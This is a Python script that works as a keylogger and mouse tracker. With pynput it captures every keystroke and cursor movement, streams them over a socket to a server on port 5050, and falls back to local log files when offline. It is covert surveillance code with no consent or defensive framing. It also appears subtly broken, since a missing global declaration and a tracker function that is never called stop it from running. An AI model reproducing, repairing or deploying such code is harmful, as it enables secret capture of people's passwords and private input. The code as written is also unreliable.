import socket
import threading
from pynput.keyboard import Listener as K_L
from pynput.mouse import Listener as M_L
import time

def write_to_file(key):
    letter = str(key).replace("'", "")

    key_map = {
        "Key.space": " ",
        "Key.backspace": " (delete) ",
        "Key.enter": " (enter) ",
        "Key.shift": " (shift) ",
        "Key.up": " (up-arrow) ",
        "Key.down": " (down-arrow) ",
        "Key.left": " (left-arrow) ",
        "Key.right": " (right-arrow) "
    }

    letter = key_map.get(letter, letter)

    try:
        if client:
            client.send(letter.encode())
        else:
            raise ConnectionError("Client not connected")
    except ConnectionError:
        print("Connection lost, writing to local file...")
        with open("klog.txt", "a") as f:
            f.write(letter + "\n")
    except Exception as e:
        print(f"Unexpected error: {e}")

def logging(x, y):
    message = f"({x},{y})\n"
    try:
        if client:
            client.send(message.encode())
        else:
            raise ConnectionError("Client not connected")
    except ConnectionError:
        print("Connection lost, writing to local file...")
        with open("mlog.txt", "a") as m:
            m.write(message)
    except Exception as e:
        print(f"Unexpected error: {e}")

def start_mouse_listener():
    with M_L(on_move=logging) as lm:
        lm.join()

def start_kb_listener():
    with K_L(on_press=write_to_file) as lk:
        lk.join()

def tracker():
    m_thread = threading.Thread(target=start_mouse_listener, daemon=True)
    k_thread = threading.Thread(target=start_kb_listener, daemon=True)
    m_thread.start()
    k_thread.start()

SERVER = socket.gethostbyname(socket.gethostname())  # IP address
PORT = 5050
ADDR = (SERVER, PORT)

client = None  

def connect_server():
    global client
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(ADDR)
        print("Connected to server")
        return client
    except (socket.error, ConnectionError) as e:
        print(f"Error connecting to server: {e}")
        return None

def maintain_connection():
    while True:
        if client is None:
            client = connect_server()
        
        if client:
            time.sleep(10)
        else:
            time.sleep(10)

tracker_thread = threading.Thread(target=maintain_connection, daemon=True)
tracker_thread.start()

while True:
    time.sleep(1)  